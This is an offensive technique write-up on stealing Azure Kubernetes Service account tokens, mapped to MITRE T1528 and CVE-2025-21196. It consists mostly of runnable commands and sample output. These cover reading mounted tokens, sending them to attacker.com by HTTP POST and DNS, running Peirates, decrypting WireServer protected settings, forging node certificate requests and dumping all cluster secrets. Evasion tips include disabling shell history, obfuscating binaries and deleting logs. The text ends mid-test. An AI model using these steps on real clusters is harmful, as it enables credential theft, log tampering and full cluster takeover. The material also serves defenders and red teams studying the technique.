# CA-TOKEN-013: AKS Service Account Token Theft

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-013 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, Azure Kubernetes Service (AKS), Kubernetes |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2025-21196 (TLS Bootstrap Attack), N/A (General Technique) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | AKS 1.6.0+, Kubernetes 1.6.0+, All current versions (1.24-1.29+) |
| **Patched In** | Kubernetes 1.28.5+ (partial mitigation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

### Concept
AKS service account token theft is a **critical credential access technique** where an attacker extracts Kubernetes service account bearer tokens from a compromised pod or node. These tokens are Base64-encoded JSON Web Tokens (JWTs) that provide API authentication to the Kubernetes control plane with the permissions of the compromised service account. Once obtained, the attacker can impersonate that service account, potentially escalating privileges, accessing secrets, deploying malicious workloads, and gaining cluster-wide control. The technique exploits the default behavior of Kubernetes mounting service account tokens into every pod, making them trivially accessible to anyone with pod command execution.

### Attack Surface
- **Direct Token Access:** `/var/run/secrets/kubernetes.io/serviceaccount/token` (mounted in all pods)
- **Secret Enumeration:** Kubernetes Secrets API (if RBAC permits)
- **Azure WireServer Metadata Service:** `168.63.129.16:80` and `168.63.129.16:32526` (for bootstrap token extraction)
- **Kubelet API:** Insecure kubelet endpoints (port 10250)
- **etcd Datastore:** Direct access to cluster secrets (post-compromise)

### Business Impact
**Catastrophic cluster compromise** leading to **complete loss of confidentiality and integrity**. An attacker with stolen service account tokens can: (1) Access all cluster secrets, ConfigMaps, and stored credentials, enabling lateral movement to databases, APIs, and cloud services; (2) Deploy cryptocurrency miners or bot nodes using cluster resources for financial loss; (3) Deploy persistent backdoors and malicious controllers for long-term access; (4) Exfiltrate sensitive application data (PII, trade secrets, source code); (5) Disrupt service availability by deleting workloads or draining nodes. In regulated environments (finance, healthcare), this results in compliance violations, regulatory fines, and reputational damage. Time-to-compromise is **seconds** after pod compromise; detection probability depends entirely on audit logging configuration.

### Technical Context
- **Execution Time:** < 1 second (direct file read) to < 5 seconds (enumeration via API)
- **Detection Difficulty:** **Low** if audit logging is enabled (generates clear API events); **Very High** if disabled
- **Stealth Rating:** **Medium-High** – Token usage blends with normal API traffic if the service account is used legitimately

---

### Operational Risk

| Risk Factor | Assessment | Details |
|---|---|---|
| **Execution Risk** | **HIGH** | Technique is guaranteed to work if pod/container execution is achieved; no mitigation required for exploitation |
| **Stealth** | **MEDIUM** | Initial token extraction (file read) is silent; token *usage* generates audit events but can be obfuscated as legitimate service activity |
| **Reversibility** | **NO** | Tokens cannot be "un-stolen"; only remediation is immediate token rotation and revocation of leaked tokens |
| **Privilege Escalation** | **HIGH** | Tokens often have broader permissions than initial execution context; bootstrap tokens enable cluster-admin equivalent access |
| **Persistence Potential** | **CRITICAL** | Tokens can be stored externally; refresh tokens (if available) enable indefinite re-authentication |

---

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.1, 5.1.1 | RBAC access control, Pod Security Policy enforcement |
| **DISA STIG** | V-242416, V-242417 | Service account token management, RBAC configuration |
| **CISA SCuBA** | KBE.SY.1.B | Workload identity and authentication mechanisms |
| **NIST 800-53** | AC-3, IA-2, AC-6 | Access enforcement, Authentication, Principle of Least Privilege |
| **GDPR** | Art. 32 | Security of Processing – cryptographic measures, access controls |
| **DORA** | Art. 9, 19 | Protection and Prevention of ICT incidents |
| **NIS2** | Art. 21, 23 | Cyber Risk Management, Supply chain and third-party management |
| **ISO 27001** | A.9.2.3, A.9.4.3 | Management of Privileged Access Rights, Access control enforcement |
| **ISO 27005** | 8.3.3 | Risk evaluation – credential theft scenarios |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges
- **Minimum:** Container execution (RCE) or legitimate pod access
- **For Direct Token Reading:** User access to pod filesystem (any container image)
- **For API Enumeration:** ServiceAccount with `get/list` on `secrets` resource in target namespaces
- **For Bootstrap Token Extraction:** Pod with `hostNetwork: true` or ability to reach `168.63.129.16`

### Required Access
- **Network:** Internal pod-to-pod communication (cluster network)
- **Port Access:** 
  - Kubernetes API Server: `6443` (for API-based enumeration)
  - Azure WireServer: `80`, `32526` (for metadata service exploitation)
  - Kubelet: `10250` (for kubelet API)

### Supported Versions

| Component | Supported Versions | Notes |
|---|---|---|
| **Kubernetes** | 1.6.0 - 1.29.0+ | Service account tokens introduced in 1.6.0; all versions affected |
| **AKS (Azure)** | All versions | Default configuration vulnerable; mitigation available since 1.24+ |
| **Azure CNI** | All versions | CNI network policy affects TLS bootstrap attack scope |
| **PowerShell** | 5.0+ | For Azure-based token enumeration |
| **kubectl** | 1.19+ | For token usage and cluster interaction |

### Tools

| Tool | Version | URL | Purpose |
|---|---|---|---|
| **Peirates** | 1.1.28+ | [https://github.com/inguardians/peirates](https://github.com/inguardians/peirates) | Automated Kubernetes token enumeration and privilege escalation |
| **kubectl** | 1.24+ | [https://kubernetes.io/docs/tasks/tools/](https://kubernetes.io/docs/tasks/tools/) | Kubernetes CLI for token usage |
| **curl** | 7.0+ | Built-in on most systems | HTTP requests to metadata service, Kubernetes API |
| **openssl** | 1.1.1+ | Built-in on Linux | Certificate handling, TLS bootstrap exploitation |
| **jq** | 1.6+ | [https://stedolan.github.io/jq/](https://stedolan.github.io/jq/) | JSON parsing for token decoding |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### A. Pod-Based Reconnaissance

#### Step 1: Verify Service Account Token Availability

**PowerShell / kubectl Reconnaissance:**
```powershell
# Check if service account token is mounted
kubectl exec <POD_NAME> -n <NAMESPACE> -- ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Expected output if token is mounted:
# -rw-r--r-- 1 root root  XXXX Dec  8 08:15 token
# -rw-r--r-- 1 root root  1099 Dec  8 08:15 ca.crt
# -rw-r--r-- 1 root root    58 Dec  8 08:15 namespace
```

**What to Look For:**
- Presence of `token` file (99.9% of pods)
- Presence of `ca.crt` (Kubernetes API CA certificate)
- `namespace` file (identifies pod's namespace)
- File permissions (readable by container process)

**Linux / Bash Reconnaissance:**
```bash
# Inside compromised pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Output: eyJhbGciOiJSUzI1NiIsImtpZCI6IkpJ... [JWT token]
```

#### Step 2: Decode JWT Token to Identify Service Account

```bash
# Extract and decode JWT (using jq if available)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Decode payload (JWT has 3 parts separated by dots)
echo $TOKEN | cut -d. -f2 | base64 -d | jq .

# Expected output:
# {
#   "iss": "https://kubernetes.default.svc.cluster.local",
#   "kubernetes.io/serviceaccount/namespace": "default",
#   "kubernetes.io/serviceaccount/secret.name": "my-sa-token-abcde",
#   "kubernetes.io/serviceaccount/service-account.name": "my-serviceaccount",
#   "kubernetes.io/serviceaccount/service-account.uid": "12345678-1234-1234-1234-123456789012",
#   "sub": "system:serviceaccount:default:my-serviceaccount"
# }
```

**What to Look For:**
- Service account name (`kubernetes.io/serviceaccount/service-account.name`)
- Namespace (`kubernetes.io/serviceaccount/namespace`)
- Subject claim (`sub`) – identifies the principal

#### Step 3: Test Token Validity

```bash
# Verify token works with Kubernetes API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc.cluster.local
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s -H "Authorization: Bearer $TOKEN" \
  --cacert $CA_CERT \
  $APISERVER/api/v1/namespaces/default/secrets

# Expected: JSON response with secrets list (if RBAC permits)
# Forbidden: HTTP 403 if token lacks permissions
```

**Success Indicators:**
- HTTP 200 or 403 (token is valid, just missing permissions)
- HTTP 401 (token is invalid or expired – rare)
- JSON response with cluster data (high-privilege token)

### B. Azure WireServer Reconnaissance (Bootstrap Token Extraction)

#### Step 1: Verify Pod Network Configuration

```bash
# Check if pod is using host network namespace
cat /proc/1/net/dev | grep -c eth0

# Or via kubectl (from attacker's machine):
kubectl describe pod <POD_NAME> -n <NAMESPACE> | grep "hostNetwork:"
# Output: "hostNetwork: true" (vulnerable to WireServer access)
```

**Version Note:** 
- **Kubernetes 1.25+:** Network namespace isolation is stricter; WireServer access requires `hostNetwork: true`
- **Kubernetes 1.24 and below:** Some CNI plugins allow cross-namespace metadata service access

#### Step 2: Enumerate Azure WireServer Availability

```bash
# Check if metadata service is accessible
curl -s -I http://168.63.129.16:80/

# Expected output if accessible:
# HTTP/1.1 200 OK
# Content-Type: text/plain
# ...

# Or on alternate port:
curl -s -I http://168.63.129.16:32526/vmSettings
```

**Suspicious Responses:**
- HTTP 200 or 202: Service is accessible (high-risk AKS configuration)
- Connection timeout: Network policies blocking access (good sign)
- Connection refused: Service not running (unlikely in AKS)

#### Step 3: Retrieve Bootstrap Token from WireServer

```bash
# Fetch VM settings from WireServer
curl -s 'http://168.63.129.16:32526/vmSettings' | jq .

# Look for:
# - extensionGoalStates[].settings[].protectedSettings
# - extensionGoalStates[].settings[].publicSettings

# Extract encrypted bootstrap token:
curl -s 'http://168.63.129.16:32526/vmSettings' | \
  jq '.extensionGoalStates[].settings[].protectedSettings' | \
  sed 's/"//g' > protected_settings.b64

# Attempt base64 decoding (if not encrypted):
cat protected_settings.b64 | base64 -d
```

**What to Look For:**
- Base64-encoded string matching pattern: `TLS_BOOTSTRAP_TOKEN=...-...`
- OpenSSL CMS-encrypted content (requires `wireserver.key` to decrypt – see Execution Methods)
- References to `KUBELET_CLIENT_CONTENT`, `KUBELET_CA_CRT`

---

### C. API-Based Service Account Enumeration (If RBAC Permits)

#### Step 1: List All Service Accounts in Cluster

```bash
# From pod with RBAC permissions:
kubectl get serviceaccounts --all-namespaces

# Or via API:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  https://kubernetes.default.svc.cluster.local/api/v1/serviceaccounts?fieldSelector=metadata.namespace!=kube-system

# Output: ServiceAccount objects with metadata
```

#### Step 2: Enumerate Secrets Associated with Service Accounts

```bash
# List all secrets (if permissions allow):
kubectl get secrets --all-namespaces -o jsonpath='{range .items[?(@.type=="kubernetes.io/service-account-token")]}{.metadata.namespace}{"\t"}{.metadata.name}{"\n"}{end}'

# Extract and decode token from secret:
kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o jsonpath='{.data.token}' | base64 -d
```

**Indicators of Vulnerable Configuration:**
- Service account tokens exposed across namespaces
- High-privilege service accounts (e.g., `cluster-admin` binding)
- Tokens in ConfigMaps or environment variables (severe misconfiguration)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Direct Token Extraction from Pod Filesystem

**Supported Versions:** Kubernetes 1.6.0 - 1.29.0+ (all versions)

#### Step 1: Gain Pod Execution Access

**Objective:** Establish interactive shell or command execution capability within a running Kubernetes pod

**Prerequisites:**
- Container vulnerability (RCE) OR
- Compromised pod credentials OR
- Privilege escalation within pod

**Command:**
```bash
# Assuming you have achieved RCE in a container
# Execute shell within the pod:
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- /bin/bash

# Or directly execute command:
kubectl exec <POD_NAME> -n <NAMESPACE> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Expected Output:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpJX21YaVM5d3pEWHhIRjV6anpKRWl4TVJGSUQ5YzNESW1CMm5xaVh...
(long Base64-encoded JWT)
```

**What This Means:**
- The token is a JWT containing three parts (header.payload.signature)
- Successfully retrieved without authentication to Kubernetes API
- Token is immediately usable for API calls with service account's permissions

**OpSec & Evasion:**
- **Hide token from process history:** Use pipes and environment variables instead of file writes
- **Avoid command logging:** Disable shell history (`unset HISTFILE; unset HISTSIZE`)
- **Detection likelihood:** **HIGH** if audit logging enabled (generates `get` verb on secret resource)
- **Mitigation:** Set `automountServiceAccountToken: false` in pod spec

**Troubleshooting:**

| Error | Cause | Fix (Kubernetes 1.19+) |
|---|---|---|
| `ls: cannot access /var/run/secrets/...`: No such file | Pod created with `automountServiceAccountToken: false` | Escalate to node; extract from kubelet config |
| `Permission denied` | Container is read-only filesystem | Escape to node level; use alternative token sources |
| `kubectl: command not found` | kubectl not installed in container | Use curl + API server; extract token directly |

**References & Proofs:**
- [Kubernetes Service Accounts Documentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
- [SANS: Stealing Service Account Tokens](https://www.sans.edu/cyber-research/kubernetes-stealing-service-account-tokens-to-obtain-cluster-admin/)

---

#### Step 2: Copy and Exfiltrate Token

**Objective:** Securely move stolen token out of pod for later use

**Command (Silent Exfiltration):**
```bash
# Inside compromised pod - store token in variable
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA_CERT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)

# Send to attacker-controlled endpoint via curl/wget
curl -s -X POST -d "token=$TOKEN&namespace=$NAMESPACE" http://attacker.com/exfil

# Or encode in DNS request (covert channel):
nslookup $(echo -n "$TOKEN" | base64 | head -c 32).attacker.com 8.8.8.8

# Or write to shared volume (if available):
echo "$TOKEN" > /mnt/shared-volume/tokens/token.txt
```

**Expected Output:**
- No output on success (silent operation)
- HTTP 200 response from exfil server
- Token now available to attacker for use against API server

**What This Means:**
- Token is now persistent; attacker can use it after pod/node is cleaned up
- Token has cluster-wide scope (or namespace scope, depending on RBAC)
- Immediate capability to query Kubernetes API with service account privileges

**OpSec & Evasion:**
- **Network exfiltration:** Use encrypted channels (HTTPS) to avoid packet inspection
- **Timing:** Exfiltrate during peak traffic periods to blend in
- **Cleanup:** Remove command from container's bash history
- **Detection likelihood:** **MEDIUM** – outbound traffic to unknown IP is suspicious

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| `curl: (7) Failed to connect to attacker.com` | Network egress blocked | Use DNS exfil, shared volumes, or in-cluster storage |
| `Permission denied: /mnt/shared-volume/` | Shared volume not writable | Write to `/tmp` or `/var/tmp` instead |

---

#### Step 3: Verify Token Usability (From Attacker Machine)

**Objective:** Test stolen token against Kubernetes API to confirm it works

**Command:**
```bash
# Get the Kubernetes API server endpoint
APISERVER="https://<AKS_CLUSTER_NAME>.aks.<REGION>.azure.com:443"
# Or: APISERVER="https://kubernetes.default.svc.cluster.local" (from within pod)

TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IkpJ..." # Stolen token

# Test token validity:
curl -s -H "Authorization: Bearer $TOKEN" \
  -k \
  $APISERVER/api/v1/namespaces

# Expected output (200): JSON with list of namespaces
# Forbidden (403): Token is valid but lacks permissions
# Unauthorized (401): Token is invalid or expired
```

**Success Indicators:**
- HTTP 200 + JSON response = **Usable token**
- HTTP 403 + "forbidden" message = **Valid token, need more enumeration**
- HTTP 401 = **Invalid token** (rare for freshly stolen tokens)

---

### METHOD 2: Service Account Token Enumeration via Peirates

**Supported Versions:** Kubernetes 1.6.0 - 1.29.0+ (all versions)
**Prerequisites:** RCE in pod with network access to Kubernetes API

#### Step 1: Deploy Peirates

**Objective:** Download and execute Peirates toolkit for automated token extraction

**Command (Inside Compromised Pod):**
```bash
# Download Peirates binary (latest version 1.1.28+)
curl -s -L https://github.com/inguardians/peirates/releases/download/v1.1.28/peirates-linux-x86_64 \
  -o /tmp/peirates

chmod +x /tmp/peirates

# Or use pre-built Docker image:
docker run -it --rm -v /var/run/secrets/kubernetes.io/serviceaccount:/serviceaccount:ro \
  bustakube/alpine-peirates:1.1.28
```

**Expected Output:**
```
 _____ _      _         _           
|  __ \| |    (_)       | |          
| |__) | | ___ _ _ __ _ | |_ ___  ___
|  ___/| |/ _ \ | '__| | | __/ _ \/ __|
| |    | |  __/ | |  | |_| ||  __/\__ \
|_|    |_|\___|_|_|   \__/\_\\___|___/

Kubernetes Penetration Testing Tool

[*] Peirates v1.1.28 initialized
[*] Available actions:
    1. Enumerate current service account
    2. Dump secrets from all namespaces
    3. Gain reverse shell on node
    4. Check RBAC permissions
    ... (16 more options)
```

**What This Means:**
- Peirates has detected current service account automatically
- Tool is ready to enumerate tokens and privileges
- Interactive menu allows chaining multiple attacks

**OpSec & Evasion:**
- **Binary delivery:** Compress with UPX or custom obfuscation to evade signature detection
- **Memory only:** Load binary directly into memory (Python `mmap`) to avoid disk writes
- **Timing:** Run during maintenance windows or high-traffic periods
- **Detection likelihood:** **HIGH** – Peirates is detected by SIEM/EDR tools; avoid on monitored clusters

**Version-Specific Notes:**
- **v1.1.26 and earlier:** Token enumeration only
- **v1.1.27+:** Added workload identity token support
- **v1.1.28+:** Fixed OAuth vulnerability, improved Azure integration

**References & Proofs:**
- [Peirates GitHub Repository](https://github.com/inguardians/peirates)
- [InGuardians Peirates Documentation](https://www.inguardians.com/peirates/)

---

#### Step 2: Enumerate All Service Account Tokens

**Objective:** Automatically collect tokens from all namespaces and service accounts

**Command (Peirates Interactive Menu):**
```
[*] Peirates> action 2
[*] Attempting to dump secrets from all namespaces...

[*] Checking namespace: default
[*] Found secret: default-token-abcde
[+] Token retrieved: eyJhbGciOiJSUzI1NiIsImtpZCI6IkpJ...

[*] Checking namespace: kube-system
[*] Found secret: coredns-token-xyz123
[+] Token retrieved: eyJhbGciOiJSUzI1NiIsImtpZCI6IlBQ...

[*] Checking namespace: kube-public
[*] Found secret: system:controller-manager-token-abc123
[+] Token retrieved: eyJhbGciOiJSUzI1NiIsImtpZCI6IlNJ...

[*] Total tokens collected: 12
[*] High-privilege tokens: 3 (cluster-admin, system:masters)
```

**What This Means:**
- Peirates has automatically extracted tokens from accessible service accounts
- **3 cluster-admin equivalent tokens found** = cluster is completely compromised
- Attacker now has multiple persistence mechanisms

**Tokens Retrieved Include:**
| Service Account | Namespace | Privilege Level | Use Case |
|---|---|---|---|
| `default` | `default` | User-level | Limited lateral movement |
| `coredns` | `kube-system` | System-level | DNS hijacking, data exfiltration |
| `controller-manager` | `kube-system` | **Cluster-admin** | Full cluster takeover |

**OpSec & Evasion:**
- **Selective enumeration:** Dump only high-value namespaces (`kube-system`, `monitoring`, `velero`)
- **Avoid enumeration logs:** Peirates will generate audit events; pair with log deletion
- **Detection likelihood:** **CRITICAL** – Multiple `get secrets` API calls across namespaces is highly suspicious

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| `Error: cannot enumerate namespace default` | RBAC denies secret access | Use current pod's service account; escalate if needed |
| `No secrets found in any namespace` | All service accounts have `automountServiceAccountToken: false` | Escalate to node; extract from kubelet |
| `Connection to API server refused` | NetworkPolicy blocking pod-to-API communication | Run from pod with network access; use kubelet instead |

---

#### Step 3: Export Tokens for External Use

**Objective:** Save enumerated tokens to file for use from attacker's machine

**Command (Peirates Menu):**
```
[*] Peirates> action 15
[*] Exporting tokens to file...

[*] Dumping tokens to: /tmp/k8s_tokens.json
[*] Format: JSON with base64-encoded tokens
[*] High-privilege tokens flagged

[+] Tokens exported successfully
```

**Expected Output:**
```json
{
  "tokens": [
    {
      "serviceAccount": "controller-manager",
      "namespace": "kube-system",
      "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IlNJIn0...",
      "privilege_level": "cluster-admin",
      "usable": true
    },
    {
      "serviceAccount": "default",
      "namespace": "monitoring",
      "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IkpJ...",
      "privilege_level": "read-only",
      "usable": true
    }
  ],
  "total_cluster_admin_tokens": 1,
  "recommendations": ["Immediately rotate all tokens", "Review RBAC policies"]
}
```

---

### METHOD 3: Bootstrap Token Extraction via Azure WireServer (CVE-2025-21196)

**Supported Versions:** AKS with Azure CNI, Kubernetes 1.25 - 1.29+
**Prerequisites:** Pod with `hostNetwork: true` or ability to reach `168.63.129.16`
**CVE:** CVE-2025-21196 (TLS Bootstrap Attack)
**Severity:** CRITICAL (enables cluster-admin equivalent access)

#### Step 1: Access Azure WireServer Metadata Service

**Objective:** Connect to Azure's metadata service to retrieve encryption keys and bootstrap tokens

**Command (Inside Pod with Host Network):**
```bash
# Test connectivity to WireServer
curl -s -I http://168.63.129.16:80/

# If reachable, fetch VM settings:
curl -s 'http://168.63.129.16:32526/vmSettings' > /tmp/vm_settings.json

# Parse for bootstrap token:
cat /tmp/vm_settings.json | jq '.extensionGoalStates[0].settings[0]'

# Expected output:
# {
#   "publicSettings": {...},
#   "protectedSettings": "MIIB...B7wg=" (Base64-encoded, encrypted)
# }
```

**Expected Output:**
```
HTTP/1.1 200 OK
Content-Type: application/json
...
{
  "vmSettings": {...},
  "extensionGoalStates": [
    {
      "settings": [
        {
          "publicSettings": {...},
          "protectedSettings": "base64_encrypted_data"
        }
      ]
    }
  ]
}
```

**What This Means:**
- WireServer is accessible (pod has direct access to host network or Azure network)
- Protected settings are encrypted with `wireserver.key` (available on node)
- Bootstrap token is embedded in provisioning script

**OpSec & Evasion:**
- **Timing:** WireServer access is logged; blend requests with other metadata service calls
- **User-Agent:** Use generic curl user-agent to avoid signatures
- **Detection likelihood:** **MEDIUM** – 168.63.129.16 access is suspicious in audit logs

**Version-Specific Notes:**
- **Kubernetes 1.25+:** NetworkPolicy stricter; requires `hostNetwork: true` or specific policy
- **AKS with Azure Network Policy:** WireServer access may be blocked by default (good sign)
- **Azure CNI (kubenet):** Metadata service more accessible (vulnerable)

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| `curl: (7) Failed to connect to 168.63.129.16` | NetworkPolicy blocking metadata service | Run on node directly; check network policies |
| `HTTP 404` | WireServer endpoint doesn't exist | Try `/metadata/instance` instead |
| `Connection reset by peer` | Azure security has detected reconnaissance | Slow down requests; use DNS exfiltration |

**References & Proofs:**
- [Mandiant: TLS Bootstrap Attack on AKS](https://cloud.google.com/blog/topics/threat-intelligence/escalating-privileges-azure-kubernetes-services)
- [Synacktiv: Bootstrap Token Exploitation](https://www.synacktiv.com/publications/so-i-became-a-node-exploiting-bootstrap-tokens-in-azure-kubernetes-service)

---

#### Step 2: Extract and Decrypt WireServer Key

**Objective:** Obtain the `wireserver.key` required to decrypt protected settings containing bootstrap token

**Command (On Node via Privileged Pod):**
```bash
# Deploy privileged pod with node access
kubectl run -it privileged-pod --image=ubuntu --privileged -- /bin/bash

# Inside privileged pod, access node filesystem:
KUBELET_CONFIG="/etc/kubernetes/kubelet.conf"
NODE_CERT="/etc/kubernetes/pki/kubelet.crt"

# Extract wirserver key from node's encrypted secrets:
# This requires direct filesystem access to node provisioning files

# Alternative: Extract from Azure WireServer via Man-in-the-Middle
# (Requires network-level privilege escalation)

# Common locations for wireserver.key:
# - /var/lib/waagent/
# - /opt/azure/
# - Embedded in provisioning script (cse_cmd.sh)

find / -name "*wireserver*" -type f 2>/dev/null
find / -name "*cse_cmd*" -type f 2>/dev/null

# Extract from cse_cmd.sh:
cat /var/lib/waagent/cse_cmd.sh | grep -oP 'wireserver.key.*' | head -c 100
```

**Expected Output:**
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA1234567890abcdefghijklmnop...
[64 lines of Base64-encoded key material]
-----END RSA PRIVATE KEY-----
```

**What This Means:**
- `wireserver.key` is obtained (asymmetric key for decrypting Azure-managed data)
- All protected settings can now be decrypted
- Bootstrap token and kubelet certificates are now accessible

**OpSec & Evasion:**
- **Hide key extraction:** Run in background; avoid interactive shells
- **Memory only:** Load key into memory; don't write to disk
- **Detection likelihood:** **CRITICAL** – Privileged pod creation and key file access are heavily monitored

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| `find: No such file or directory` | Paths are Azure-specific; vary by region | Search entire filesystem or check Azure documentation |
| `Permission denied` | Privileged pod doesn't have node filesystem access | Escalate to kubelet; use node shell escape |
| `Key not found` | Key is stored in Azure Vault, not on node | Use Azure CLI with stolen credentials |

---

#### Step 3: Decrypt Protected Settings and Extract Bootstrap Token

**Objective:** Use `wireserver.key` to decrypt protected settings containing TLS_BOOTSTRAP_TOKEN

**Command:**
```bash
# Decrypt protected settings using openssl
PROTECTED_SETTINGS="base64_encrypted_blob_from_step_1"
WIRESERVER_KEY="wireserver.key"

# First, base64 decode the protected settings:
echo "$PROTECTED_SETTINGS" | base64 -d > /tmp/protected_settings.der

# Decrypt using openssl CMS:
openssl cms -decrypt \
  -inform DER \
  -in /tmp/protected_settings.der \
  -inkey $WIRESERVER_KEY \
  -out /tmp/decrypted_settings.txt

# Extract bootstrap token:
cat /tmp/decrypted_settings.txt | grep -oP 'TLS_BOOTSTRAP_TOKEN=\K[^&\s]+' | head -1

# Expected output:
# 71zkdy.fmcsstmk697ibh9x
```

**Expected Output:**
```
-----BEGIN DECRYPTED CONTENT-----
KUBELET_CLIENT_CONTENT=LS0tLS1CRUdJTi...
KUBELET_CLIENT_CERT_CONTENT=LS0tLS1CRUdJTi...
KUBELET_CA_CRT=LS0tLS1CRUdJTiBDRVJ...
TLS_BOOTSTRAP_TOKEN=71zkdy.fmcsstmk697ibh9x
-----END DECRYPTED CONTENT-----
```

**Token Format Analysis:**
- Pattern: `[a-z0-9]{6}\.[a-z0-9]{24}` (ID.Secret)
- ID: Used to identify which bootstrap token secret to use
- Secret: Shared secret between kubeadm and API server
- Validity: Long-lived (weeks to months); enables permanent cluster access

**What This Means:**
- **Complete cluster compromise:** Bootstrap token can request new node certificates
- **Persistence:** Token persists across pod/node restarts
- **Privilege escalation:** Token can approve certificate signing requests (CSRs)
- **Cluster-admin equivalent:** With cert, attacker can access all cluster secrets

**OpSec & Evasion:**
- **Remove decrypted files:** `shred /tmp/decrypted_settings.txt /tmp/protected_settings.der`
- **Timing:** Decryption happens locally; no network signature
- **Detection likelihood:** **LOW** (if no audit logging) to **HIGH** (if openssl process execution is monitored)

---

#### Step 4: Use Bootstrap Token to Request Node Certificate

**Objective:** Use stolen bootstrap token to request a signed certificate from Kubernetes API, enabling impersonation of cluster node

**Command:**
```bash
# Create certificate signing request (CSR) for a node
# (Using bootstrap token for authentication)

# First, generate private key and CSR:
openssl genrsa -out /tmp/node.key 2048

openssl req -new \
  -key /tmp/node.key \
  -out /tmp/node.csr \
  -subj "/O=system:nodes/CN=system:node:aks-pool-20854315-vmss000001"

# Convert CSR to base64:
CSR_B64=$(cat /tmp/node.csr | base64 | tr -d '\n')

# Create Kubernetes CertificateSigningRequest object:
cat << EOF | kubectl --token 71zkdy.fmcsstmk697ibh9x \
  --insecure-skip-tls-verify \
  --server https://10.0.0.1:6443 \
  apply -f -

apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: attacker-node-csr
spec:
  signerName: kubernetes.io/kube-apiserver-client-kubelet
  request: $CSR_B64
  usages:
    - digital signature
    - key encipherment
    - client auth
EOF

# Expected output:
# certificatesigningrequest.certificates.k8s.io/attacker-node-csr created
```

**What This Means:**
- CSR is **automatically approved** by Kubernetes (bootstrap token is whitelisted)
- Attacker now has signed certificate for node authentication
- Can now authenticate directly to API server as `system:node:*`

**Node Role Capabilities:**
- List all pods on assigned node
- Access all secrets associated with pods
- Modify pod specifications
- Access kubelet API directly

**OpSec & Evasion:**
- **Name CSR carefully:** Use generic node names that blend with cluster (`aks-pool-XXXXX-vmssYYYYYY`)
- **Timing:** CSR approval happens automatically; minimal detection window
- **Detection likelihood:** **HIGH** – CSR creation with bootstrap token is a strong IoC

---

#### Step 5: Extract All Secrets Using Node Certificate

**Objective:** Use the obtained node certificate to access all cluster secrets via Kubernetes API

**Command:**
```bash
# Retrieve the signed certificate from CSR:
kubectl --insecure-skip-tls-verify \
  --token 71zkdy.fmcsstmk697ibh9x \
  --server https://10.0.0.1:6443 \
  get csr attacker-node-csr \
  -o jsonpath='{.status.certificate}' \
  | base64 -d > /tmp/node.crt

# Now use the certificate + key to authenticate:
kubectl --client-certificate=/tmp/node.crt \
  --client-key=/tmp/node.key \
  --insecure-skip-tls-verify \
  --server https://10.0.0.1:6443 \
  get secrets -A

# This returns ALL secrets in the cluster:
NAMESPACE       NAME                               TYPE                 DATA   AGE
default         default-token-abcde                 kubernetes.io/...    3      245d
kube-system     coredns-token-xyz123                kubernetes.io/...    3      245d
monitoring      prometheus-secret                   Opaque               5      120d
app-prod        database-password                   Opaque               1      45d
app-prod        api-key-external-service            Opaque               1      30d
...

# Extract sensitive secrets:
kubectl --client-certificate=/tmp/node.crt \
  --client-key=/tmp/node.key \
  --insecure-skip-tls-verify \
  --server https://10.0.0.1:6443 \
  get secret database-password -n app-prod \
  -o jsonpath='{.data.password}' | base64 -d

# Output: production_db_password_12345!@#$%
```

**What This Means:**
- **Complete credential exfiltration:** All database passwords, API keys, certificates
- **Lateral movement:** Credentials enable access to external systems (RDS, APIs, SaaS)
- **Full cluster takeover:** Node certificate is equivalent to cluster-admin
- **Persistence:** Certificate is valid for 365+ days; attacker has permanent access

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** Kubernetes T1528 (not yet in Atomic; custom implementation)
- **Test Name:** Steal Kubernetes Service Account Token
- **Description:** Simulates extraction of mounted service account token from compromised pod
- **Supported Versions:** Kubernetes 1.19+

**Manual Test Execution:**
```bash
# 1. Create test pod with default service account:
kubectl run test-pod --image=nginx --namespace=default

# 2. Execute token extraction:
kubectl exec test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 3. Verify token format (should be valid JWT):
